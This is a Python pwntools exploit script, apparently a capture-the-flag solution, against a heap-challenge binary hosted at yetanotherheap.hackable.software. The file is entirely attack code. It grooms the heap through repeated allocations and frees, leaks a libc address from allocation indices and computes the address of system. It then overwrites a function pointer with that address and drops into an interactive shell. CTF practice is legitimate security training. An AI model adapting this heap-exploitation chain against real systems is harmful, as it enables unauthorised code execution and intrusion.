from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './heap'
HOST = 'yetanotherheap.hackable.software'
PORT = 1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def alloc(size, payload):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(size))
    r.recvuntil('id: ')
    try:
        idx = int(r.recvuntil('\n', True))
    except:
        idx = -1
    r.sendafter(': ', payload)
    return idx

def delete(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', str(idx))

r = start()

alloc(0x10, 'A'*0x10)
for i in range(60):
    alloc(0x20, flat(0x21, 0x21, 0x21, 0x21))
alloc(0x30, 'C'*0x30)

delete(0)
alloc(0x10, p32(0x20)+p32(0xffffffff)+p64(0xffff))
alloc(0x20, flat(0, 0x611)+p32(0x10)+p32(0x3)+p64(0))

delete(97)
delete(48)

alloc(0x11, flat(0, 0x611)+'\xe0')
# alloc(0x18, flat(0, 0x421)+p32(0x10)+p32(0xffffffff))
while 1:
    idx = alloc(1, '1')
    if idx == 0x7f:
        break

leak = '' 
while len(leak) < 8*6:
    prev = idx
    idx = alloc(1, '1')
    if idx - prev != 1:
        leak = '0'+'1' * (idx - prev - 1) + leak
    else:
        leak = '0'+leak
    print leak
leak = int(leak, 2)
dbg('leak')
base = leak - 0x1ebbe0
dbg('base')
system = base + 0x55410



size = 0x5920
idx = alloc(0x600, 'a'*0x600)
delete(idx-1)
payload = p32(size)+p32(0xffffffff)+p64(0x7fffffffffffffff)
payload = payload.ljust(0x600, 'A')
alloc(0x600, payload)

if args.D:
    debug(r, [0x1a86])
payload = 'c'*0x2838
payload += p64(system)
payload = payload.ljust(size, '\x00')

alloc(size, payload)

delete(idx-1)
payload = "sh\x00\x00"+p32(0x3)+p64(0)
payload = payload.ljust(size, 'A')
alloc(size, payload)
delete(idx)

r.interactive()
r.close()
